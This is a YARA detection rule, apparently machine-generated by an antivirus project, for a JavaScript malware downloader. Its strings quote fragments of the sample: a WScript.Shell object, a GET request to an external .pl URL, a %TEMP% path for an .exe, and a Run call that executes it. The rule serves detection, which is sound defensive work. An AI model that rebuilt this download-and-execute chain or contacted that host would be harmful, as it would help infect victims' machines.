rule sig_20160330_89ed235b7fccc9bf422858a95f0b37a8 {
  meta:
    description = "datamaliciousorder - file 20160330_89ed235b7fccc9bf422858a95f0b37a8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6966b8683762cd5f48ac1532101367a73db491aaa60cd17949e79bca35ac118"

  strings:
    $s1  = "var H = function I() {return WScript[XN](\"WScript\"+\".Shell\");}(), O = 11;" fullword ascii
    $s2  = "function LB(DM, T0){FS = FS * 1; return DM - T0;};" fullword ascii
    $s3  = "R1[YG](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s4  = "if (R1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function R(){return KT + \"\";};" fullword ascii
    $s6  = "function UM() {return H[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tAhu2bunNKJU2.ex\" + \"e\";};" fullword ascii
    $s7  = "function AJ() {return ((ZN == true) && (ZN == U)) ? 1 : FS;};" fullword ascii
    $s8  = "function FK(G){H[\"Run\"](G, FS, FS);};" fullword ascii
    $s9  = "var L = new this[\"Date\"]();" fullword ascii
    $s10 = "function TN()" fullword ascii
    $s11 = "function TP(){return XN;};" fullword ascii
    $s12 = "return LB(FE, AD);" fullword ascii
    $s13 = "}while (T);" fullword ascii
    $s14 = "function S(F) {var DI = (1, 2, 3, 4, 5, F); return DI;};" fullword ascii
    $s15 = "function MC(){return 22;};" fullword ascii
    $s16 = "var Z0 = false;" fullword ascii
    $s17 = "U = true; " fullword ascii
    $s18 = "var U = false;" fullword ascii
    $s19 = "var ZN = false;" fullword ascii
    $s20 = "ZN = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}